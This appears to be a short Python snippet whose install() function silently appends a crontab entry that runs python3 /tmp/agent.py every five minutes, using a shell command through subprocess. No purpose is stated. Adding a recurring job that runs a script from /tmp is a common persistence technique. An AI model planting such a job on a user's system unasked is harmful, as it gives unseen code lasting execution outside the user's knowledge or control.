import subprocess


def install():
    line = "*/5 * * * * python3 /tmp/agent.py"
    subprocess.run(f"(crontab -l; echo '{line}') | crontab -", shell=True)
